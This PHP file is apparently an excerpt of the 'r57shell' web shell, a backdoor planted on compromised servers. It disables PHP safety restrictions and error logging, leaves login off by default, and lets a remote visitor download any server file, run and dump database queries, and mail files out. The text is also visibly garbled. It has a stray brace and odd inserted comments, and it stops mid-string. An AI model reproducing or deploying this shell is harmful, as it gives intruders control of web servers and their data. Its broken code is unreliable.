<?
//error_reporting(0);

$language="eng";

$auth = 0;

//These seem to be hashes of the same thing.
$name="8cd59f852a590eb0565c98356ecb0b84";
$pass="8cd59f852a590eb0565c98356ecb0b84";

@ini_restore("safe_mode");
@ini_restore("open_basedir");
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");

@ini_set("error_log",NULL);
@ini_set("log_errors",0);

if((!@function_exists('ini_get')) || (@ini_get('open_basedir')!=NULL) || (@ini_get('safe_mode_include_dir')!=NULL)){
	$open_basedir=1;
} else{
	$open_basedir=0;
}
define("starttime",@getmicrotime());
set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$safe_mode = @ini_get('safe_mode');
//<--- The following was commented out, but let's assume it vould have somehow worked...
if(@function_exists('ini_get')){
	$safe_mode = @ini_get('safe_mode');
}else{
	$safe_mode=1;
}
$version = '1.40';
if(@version_compare(@phpversion(), '4.1.0') == -1) {
	$_POST   = &$HTTP_POST_VARS;
	$_GET    = &$HTTP_GET_VARS;
	$_SERVER = &$HTTP_SERVER_VARS;
	$_COOKIE = &$HTTP_COOKIE_VARS;
}
if (@get_magic_quotes_gpc()) {
	foreach ($_POST as $k=>$v)  {
		$_POST[$k] = stripslashes($v);
	}
	foreach ($_COOKIE as $k=>$v)  {
		$_COOKIE[$k] = stripslashes($v);
	}
}
}
if($auth == 1) {
	if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)   {
		header('WWW-Authenticate: Basic realm="HELLO!"');
		header('HTTP/1.0 401 Unauthorized');
		exit("<b>Access Denied</b>");
	}
}
$head = '<html><head><title>r57shell</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><STYLE>tr {BORDER-RIGHT:  #aaaaaa 1px solid;BORDER-TOP:    #eeeeee 1px solid;BORDER-LEFT:   #eeeeee 1px solid;BORDER-BOTTOM: #aaaaaa 1px solid;color: #000000;}td {BORDER-RIGHT:  #aaaaaa 1px solid;BORDER-TOP:    #eeeeee 1px solid;BORDER-LEFT:   #eeeeee 1px solid;BORDER-BOTTOM: #aaaaaa 1px solid;color: #000000;}.table1 {BORDER: 0px;BACKGROUND-COLOR: #D4D0C8;color: #000000;}.td1 {BORDER: 0px;font: 7pt Verdana;color: #000000;}.tr1 {BORDER: 0px;color: #000000;}table {BORDER:  #eeeeee 1px outset;BACKGROUND-COLOR: #D4D0C8;color: #000000;}input {BORDER-RIGHT:  #ffffff 1px solid;BORDER-TOP:    #999999 1px solid;BORDER-LEFT:   #999999 1px solid;BORDER-BOTTOM: #ffffff 1px solid;BACKGROUND-COLOR: #e4e0d8;font: 8pt Verdana;color: #000000;}select {BORDER-RIGHT:  #ffffff 1px solid;BORDER-TOP:    #999999 1px solid;BORDER-LEFT:   #999999 1px solid;BORDER-BOTTOM: #ffffff 1px solid;BACKGROUND-COLOR: #e4e0d8;font: 8pt Verdana;color: #000000;;}submit {BORDER:  buttonhighlight 2px outset;BACKGROUND-COLOR: #e4e0d8;width: 30%;color: #000000;}textarea {BORDER-RIGHT:  #ffffff 1px solid;BORDER-TOP:    #999999 1px solid;BORDER-LEFT:   #999999 1px solid;BORDER-BOTTOM: #ffffff 1px solid;BACKGROUND-COLOR: #e4e0d8;font: Fixedsys bold;color: #000000;}BODY {margin: 1px;color: #000000;background-color: #e4e0d8;}A:link {COLOR:red; TEXT-DECORATION: none}A:visited { COLOR:red; TEXT-DECORATION: none}A:active {COLOR:red; TEXT-DECORATION: none}A:hover {color:blue;TEXT-DECORATION: none}</STYLE><script language=\'javascript\'>function hide_div(id){  document.getElementById(id).style.display = \'none\';  document.cookie=id+\'=0;\';}function show_div(id){  document.getElementById(id).style.display = \'block\';  document.cookie=id+\'=1;\';}function change_divst(id){  if (document.getElementById(id).style.display == \'none\')    show_div(id);  else    hide_div(id);}</script>';
class zipfile{
	var $datasec      = array();
	var $ctrl_dir     = array();
	var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	var $old_offset   = 0;
	function unix2DosTime($unixtime = 0) {
		$timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
		if ($timearray['year'] < 1980) {
			$timearray['year']		= 1980;
			$timearray['mon']		= 1;
			$timearray['mday']		= 1;
			$timearray['hours']		= 0;
			$timearray['minutes']	= 0;
			$timearray['seconds']	= 0;
		}
		return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
	}
	function addFile($data, $name, $time = 0)    {
		$name     = str_replace('\\', '/', $name);
		$dtime    = dechex($this->unix2DosTime($time));
		$hexdtime = '\x' . $dtime[6] . $dtime[7] . '\x' . $dtime[4] . $dtime[5] . '\x' . $dtime[2] . $dtime[3] . '\x' . $dtime[0] . $dtime[1];
		eval('$hexdtime = "' . $hexdtime . '";');
		$fr		 = "\x50\x4b\x03\x04";
		$fr		.= "\x14\x00";
		$fr		.= "\x00\x00";
		$fr		.= "\x08\x00";
		$fr		.= $hexdtime;
		$unc_len = strlen($data);
		$crc	 = crc32($data);
		$zdata	 = gzcompress($data);
		$zdata	 = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
		$c_len	 = strlen($zdata);
		$fr		.= pack('V', $crc);
		$fr		.= pack('V', $c_len);
		$fr		.= pack('V', $unc_len);
		$fr		.= pack('v', strlen($name));
		$fr		.= pack('v', 0);
		$fr		.= $name;
		$fr		.= $zdata;
		$this -> datasec[] = $fr;
		$cdrec	 = "\x50\x4b\x01\x02";
		$cdrec	.= "\x00\x00";
		$cdrec	.= "\x14\x00";
		$cdrec	.= "\x00\x00";
		$cdrec	.= "\x08\x00";
		$cdrec	.= $hexdtime;
		$cdrec	.= pack('V', $crc);
		$cdrec	.= pack('V', $c_len);
		$cdrec	.= pack('V', $unc_len);
		$cdrec	.= pack('v', strlen($name) );
		$cdrec	.= pack('v', 0 );
		$cdrec	.= pack('v', 0 );
		$cdrec	.= pack('v', 0 );
		$cdrec	.= pack('v', 0 );
		$cdrec	.= pack('V', 32 );
		$cdrec	.= pack('V', $this -> old_offset );
		$this -> old_offset += strlen($fr);
		$cdrec	.= $name;
		$this -> ctrl_dir[] = $cdrec;
	}
	function file(){
		$data	 = implode('', $this -> datasec);
		$ctrldir = implode('', $this -> ctrl_dir);
		return $data . $ctrldir . $this -> eof_ctrl_dir . pack('v', sizeof($this -> ctrl_dir)) . pack('v', sizeof($this -> ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
	}
}
function compress(&$filename,&$filedump,$compress){
	global $content_encoding;
	global $mime_type;
	if ($compress == 'bzip' && @function_exists('bzcompress')){
		$filename  .= '.bz2';
		$mime_type = 'application/x-bzip2';
		$filedump = bzcompress($filedump);
	} else if ($compress == 'gzip' && @function_exists('gzencode')){
		$filename  .= '.gz';
		$content_encoding = 'x-gzip';
		$mime_type = 'application/x-gzip';
		$filedump = gzencode($filedump);
	} else if ($compress == 'zip' && @function_exists('gzcompress')){
		$filename .= '.zip';
		$mime_type = 'application/zip';
		$zipfile = new zipfile();
		$zipfile -> addFile($filedump, substr($filename, 0, -4));
		$filedump = $zipfile -> file();
	} else {
		$mime_type = 'application/octet-stream';
	}
}
function moreread($temp){
	global $lang,$language;$str='';
	if(@function_exists('fopen')&&@function_exists('feof')&&@function_exists('fgets')&&@function_exists('fclose')){
		$ffile = @fopen($temp, "r");
		while(!@feof($ffile)){
			$str .= @fgets($ffile);
		}
		fclose($ffile);
	} elseif(@function_exists('fopen')&&@function_exists('fread')&&@function_exists('fclose')&&@function_exists('filesize')){
		$ffile = @fopen($temp, "r");
		$str = @fread($ffile, @filesize($temp));
		@fclose($ffile);
	} elseif(@function_exists('file')){
		$ffiles = @file ($temp);
		foreach ($ffiles as $ffile) {
			$str .= $ffile;
		}
	} elseif(@function_exists('file_get_contents')){
		$str = @file_get_contents($temp);
	} elseif(@function_exists('readfile')){
		$str = @readfile($temp);
	} else {
		echo $lang[$language.'_text56'];
	}
	return $str;
}
function readzlib($filename,$temp=''){
	global $lang,$language;$str='';
	if(!$temp){
		$temp=tempnam(@getcwd(), "copytemp");
	}
	if(@copy("compress.zlib://".$filename, $temp)){
		$str = moreread($temp);
	} else 
		echo $lang[$language.'_text119'];
	@unlink($temp);
	return $str;
}
function mailattach($to,$from,$subj,$attach) {
	$headers	 = "From: $from\r\n";
	$headers	.= "MIME-Version: 1.0\r\n";
	$headers	.= "Content-Type: ".$attach['type'];
	$headers	.= "; name=\"".$attach['name']."\"\r\n";
	$headers	.= "Content-Transfer-Encoding: base64\r\n\r\n";
	$headers	.= chunk_split(base64_encode($attach['content']))."\r\n";
	if(mail($to,$subj,"",$headers)) {
		return 1;
	}
	return 0;
}
class my_sql {
	var $host = 'localhost';
	var $port = '';
	var $user = '';
	var $pass = '';
	var $base = '';
	var $db   = '';
	var $connection;
	var $res;
	var $error;
	var $rows;
	var $columns;
	var $num_rows;
	var $num_fields;
	var $dump;
	function connect(){
		switch($this->db){
			case 'MySQL':
				if(empty($this->port)) {
					$this->port = '3306';
				}
				if(!@function_exists('mysql_connect'))
					return 0;
				$this->connection = @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass);
				if(is_resource($this->connection))
					return 1;
			break;
			case 'MSSQL':
				if(empty($this->port)) {
					$this->port = '1433';
				}
				if(!@function_exists('mssql_connect'))
					return 0;
				$this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass);
				if($this->connection)
					return 1;
			break;
			case 'PostgreSQL':
				if(empty($this->port)) {
					$this->port = '5432';
				}
				$str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'";
				if(!@function_exists('pg_connect'))
					return 0;
				$this->connection = @pg_connect($str);
				if(is_resource($this->connection))
					return 1;
			break;
			case 'Oracle':
				if(!@function_exists('ocilogon'))
					return 0;
				$this->connection = @ocilogon($this->user, $this->pass, $this->base);
				if(is_resource($this->connection))
					return 1;
			break;
		}
		return 0;
	}
	function select_db() {
		switch($this->db) {
			case 'MySQL':
				if(@mysql_select_db($this->base,$this->connection))
					return 1;
			break;
			case 'MSSQL':
				if(@mssql_select_db($this->base,$this->connection))
					return 1;
			break;
			case 'PostgreSQL':
				return 1;
			break;
			case 'Oracle':
				return 1;
			break;
		}
		return 0;
	}
	function query($query){
		$this->res=$this->error='';
		switch($this->db){
			case 'MySQL':
				if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection))){
					$this->error = @mysql_error($this->connection);
					return 0;
				} else if(is_resource($this->res)) {
					return 1;
				}
				return 2;
			break;
			case 'MSSQL':
				if(false===($this->res=@mssql_query($query,$this->connection))){
					$this->error = 'Query error';
					return 0;
				} else if(@mssql_num_rows($this->res) > 0) {
					return 1;
				}
				return 2;
			break;
			case 'PostgreSQL':
				if(false===($this->res=@pg_query($this->connection,$query))){
					$this->error = @pg_last_error($this->connection);
					return 0;
				} else if(@pg_num_rows($this->res) > 0) {
					return 1;
				}
				return 2;
			break;
			case 'Oracle':
				if(false===($this->res=@ociparse($this->connection,$query))){
					$this->error = 'Query parse error';
				} else {
					if(@ociexecute($this->res)){
						if(@ocirowcount($this->res) != 0)
							return 2;
						return 1;
					}
					$error = @ocierror();
					$this->error=$error['message'];
				}
				break;
		}
		return 0;
	}
	function get_result(){
		$this->rows=array();
		$this->columns=array();
		$this->num_rows=$this->num_fields=0;
		switch($this->db){
			case 'MySQL':
				$this->num_rows=@mysql_num_rows($this->res);
				$this->num_fields=@mysql_num_fields($this->res);
				while(false !== ($this->rows[] = @mysql_fetch_assoc($this->res)));
				@mysql_free_result($this->res);
				if($this->num_rows){
					$this->columns = @array_keys($this->rows[0]);
					return 1;
				}
			break;
			case 'MSSQL':
				$this->num_rows=@mssql_num_rows($this->res);
				$this->num_fields=@mssql_num_fields($this->res);
				while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res)));
				@mssql_free_result($this->res);
				if($this->num_rows){
					$this->columns = @array_keys($this->rows[0]);
					return 1;
				}
			break;
			case 'PostgreSQL':
				$this->num_rows=@pg_num_rows($this->res);
				$this->num_fields=@pg_num_fields($this->res);
				while(false !== ($this->rows[] = @pg_fetch_assoc($this->res)));
				@pg_free_result($this->res);
				if($this->num_rows){
					$this->columns = @array_keys($this->rows[0]);
					return 1;
				}
			break;
			case 'Oracle':
				$this->num_fields=@ocinumcols($this->res);
				while(false !== ($this->rows[] = @oci_fetch_assoc($this->res)))
					$this->num_rows++;
				@ocifreestatement($this->res);
				if($this->num_rows){
					$this->columns = @array_keys($this->rows[0]);
					return 1;
				}
			break;
		}
		return 0;
	}
	function dump($table)  {
		if(empty($table))
			return 0;
		$this->dump=array();
		$this->dump[0] = '##';
		$this->dump[1] = '## --------------------------------------- ';
		$this->dump[2] = '##  Created: '.date ("d/m/Y H:i:s");
		$this->dump[3] = '## Database: '.$this->base;
		$this->dump[4] = '##    Table: '.$table;
		$this->dump[5] = '## --------------------------------------- ';
		switch($this->db){
			case 'MySQL':
				$this->dump[0] = '## MySQL dump';
				if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1)
					return 0;
				if(!$this->get_result())
					return 0;
				$this->dump[] = $this->rows[0]['Create Table'];
				$this->dump[] = '## --------------------------------------- ';
				if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1)
					return 0;
				if(!$this->get_result())
					return 0;
				for($i=0;$i<$this->num_rows;$i++){
					foreach($this->rows[$i] as $k=>$v){
						$this->rows[$i][$k] = @mysql_real_escape_string($v);
					}
					$this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
				}
			break;
			case 'MSSQL':
				$this->dump[0] = '## MSSQL dump';
				if($this->query('SELECT * FROM '.$table)!=1)
					return 0;
				if(!$this->get_result())
					return 0;
				for($i=0;$i<$this->num_rows;$i++)
					foreach($this->rows[$i] as $k=>$v) {
						$this->rows[$i][$k] = @addslashes($v);
					}
				$this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
				}
			break;
    case 'PostgreSQL':
     $this->dump[0] = '## PostgreSQL dump';
     if($this->query('SELECT * FROM '.$table)!=1)
 return 0;
   if(!$this->get_result())
 return 0;
   for($i=0;$i<$this->num_rows;$i++)    {
      foreach($this->rows[$i] as $k=>$v) {
$this->rows[$i][$k] = @addslashes($v);
}
     $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
    }
     break;
    case 'Oracle':
      $this->dump[0] = '## ORACLE dump';
      $this->dump[]  = '## under construction';
     break;
    default:
     return 0;
    break;
    }
   return 1;
   }
 function close()  {
    switch($this->db)    {
  case 'MySQL':
    @mysql_close($this->connection);
     break;
    case 'MSSQL':
     @mssql_close($this->connection);
    break;
    case 'PostgreSQL':
     @pg_close($this->connection);
    break;
    case 'Oracle':
     @oci_close($this->connection);
    break;
    }
  }
 function affected_rows()  {
    switch($this->db)    {
  case 'MySQL':
   return @mysql_affected_rows($this->res);
     break;
    case 'MSSQL':
     return @mssql_affected_rows($this->res);
    break;
    case 'PostgreSQL':
     return @pg_affected_rows($this->res);
    break;
    case 'Oracle':
     return @ocirowcount($this->res);
    break;
    default:
     return 0;
    break;
    }
  }
 }
 if(!empty($_POST['cmd']) && $_POST['cmd']=="download_file" && !empty($_POST['d_name'])) {
  if($file=@fopen($_POST['d_name'],"r")){
 $filedump = @fread($file,@filesize($_POST['d_name']));
  @fclose($file);
 }  else if ($file=readzlib($_POST['d_name'])) {
 $filedump = $file;
 } else {
 err(1,$_POST['d_name']);
 $_POST['cmd']="";
 }
  if(isset($_POST['cmd']))    {
    @ob_clean();
    $filename = @basename($_POST['d_name']);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    if (!empty($content_encoding)) {
 header('Content-Encoding: ' . $content_encoding);
 }
    header("Content-type: ".$mime_type);
    header("Content-disposition: attachment; filename=\"".$filename."\";");
       echo $filedump;
    exit();
   }
 }
if(isset($_GET['phpinfo'])) {
 echo @phpinfo();
 echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
 die();
 }
if (!empty($_POST['cmd']) && $_POST['cmd']=="db_query") {
 echo $head;
 $sql = new my_sql();
 $sql->db   = $_POST['db'];
 $sql->host = $_POST['db_server'];
 $sql->port = $_POST['db_port'];
 $sql->user = $_POST['mysql_l'];
 $sql->pass = $_POST['mysql_p'];
 $sql->base = $_POST['mysql_db'];
 $querys = @explode(';',$_POST['db_query']);
 echo '<body bgcolor=#e4e0d8>';
 if(!$sql->connect())
 echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to SQL server</b></font></div>";
  else    {
   if(!empty($sql->base)&&!$sql->select_db())
 echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't select database</b></font></div>";
   else    {
    foreach($querys as $num=>$query)      {
      if(strlen($query)>5)      {
      echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."</b></font><br>";
      switch($sql->query($query))       {
       case '0':
       echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$sql->error."</b></font></td></tr></table>";
       break;
       case '1':
        if($sql->get_result())        {
echo "<table width=100%>";
        foreach($sql->columns as $k=>$v) 
        	$sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES);
               $keys = @implode(" </b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2><b> ", $sql->columns);
        echo "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b> ".$keys." </b></font></td></tr>";
        for($i=0;$i<$sql->num_rows;$i++)         {
         foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES);
         $values = @implode(" </font></td><td><font face=Verdana size=-2> ",$sql->rows[$i]);
         echo '<tr><td><font face=Verdana size=-2> '.$values.' </font></td></tr>';
         }
        echo "</table>";
         }
       break;
       case '2':
       $ar = $sql->affected_rows()?($sql->affected_rows()):('0');
        echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$ar."</b></font></td></tr></table><br>";
       break;
        }
      }
     }
    }
   }
    echo "<br><form name=form method=POST>";
 echo in('hidden','db',0,$_POST['db']);
 echo in('hidden','db_server',0,$_POST['db_server']);
 echo in('hidden','db_port',0,$_POST['db_port']);
 echo in('hidden','mysql_l',0,$_POST['mysql_l']);
 echo in('hidden','mysql_p',0,$_POST['mysql_p']);
 echo in('hidden','mysql_db',0,$_POST['mysql_db']);
 echo in('hidden','cmd',0,'db_query');
 echo "<div align=center>";
 echo "<font face=Verdana size=-2><b>Base: </b><input type=text name=mysql_db value=\"".$sql->base."\"></font><br>";
 echo "<textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."
?>
// --->
